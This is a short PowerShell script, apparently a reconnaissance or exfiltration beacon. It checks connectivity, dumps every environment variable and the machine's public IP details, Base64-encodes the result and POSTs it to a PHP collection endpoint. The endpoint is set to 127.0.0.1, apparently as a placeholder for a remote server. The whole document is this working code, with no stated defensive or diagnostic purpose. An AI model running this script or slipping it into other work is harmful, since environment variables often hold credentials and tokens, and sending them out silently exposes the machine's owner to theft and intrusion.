# Output variable
$outputContent = ""

# Ping
$outputContent += "=== PING Server ===`n"
$outputContent += (Test-Connection -ComputerName 127.0.0.1 -Count 4 | Out-String)

# Check if ping was successful
if ($? -eq $True){
    # Set
    $outputContent += "`n=== SET ===`n"
    $outputContent += (Get-ChildItem Env: | Out-String)

    # Curl
    $outputContent += "`n=== CURL ifconfig.me/all ===`n"
    try {
        $response = Invoke-WebRequest -Uri "http://ifconfig.me/all"
        $outputContent += ($response.Content | Out-String)
    } catch {
        Write-Error "Failed to fetch http://ifconfig.me/all"
    }
}

$outputContent += "`n=== END ===`n"

# Convert to Base64
$base64OutputContent = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($outputContent))

# Send with POST request
$URI = "http://127.0.0.1/ServerFile/returnFile.php"
$Form = @{
    file=$base64OutputContent
}
Invoke-WebRequest -Uri $URI -Method POST -Body $Form
